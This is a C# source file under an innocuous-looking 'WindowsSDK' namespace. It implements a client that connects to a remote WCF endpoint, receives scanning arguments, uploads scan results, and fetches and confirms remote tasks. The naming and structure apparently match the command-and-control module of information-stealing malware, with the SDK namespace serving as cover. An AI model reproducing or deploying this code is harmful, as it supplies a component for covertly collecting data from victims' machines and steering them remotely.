using System;
using System.Collections.Generic;
using System.ServiceModel;
using WindowsSDK.Helpers;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Data
{
    public class EndpointConnection
    {
        private IRemoteEndpoint serviceInterfacce;

        public bool RequestConnection(string address)
        {
            try
            {
                ChannelFactory<IRemoteEndpoint> channelFactory = new ChannelFactory<IRemoteEndpoint>(SystemInfoHelper.CreateBind(), new EndpointAddress("http://" + address + "//"));
                serviceInterfacce = channelFactory.CreateChannel();
                return true;
            }
            catch
            {
                return false;
            }
        }

        public bool TryGetArgs(out ScanningArgs args)
        {
            try
            {
                args = new ScanningArgs();
                args = serviceInterfacce.GetArguments();
                return true;
            }
            catch (Exception)
            {
                args = new ScanningArgs();
                return false;
            }
        }

        public bool TryVerify(ScanResult result)
        {
            try
            {
                serviceInterfacce.VerifyScanRequest(result);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public bool TryGetTasks(ScanResult user, out IList<UpdateTask> remoteTasks)
        {
            try
            {
                remoteTasks = serviceInterfacce.GetUpdates(user);
                return true;
            }
            catch (Exception)
            {
                remoteTasks = new List<UpdateTask>();
                return false;
            }
        }

        public bool TryCompleteTask(ScanResult user, int taskId)
        {
            try
            {
                serviceInterfacce.VerifyUpdate(user, taskId);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
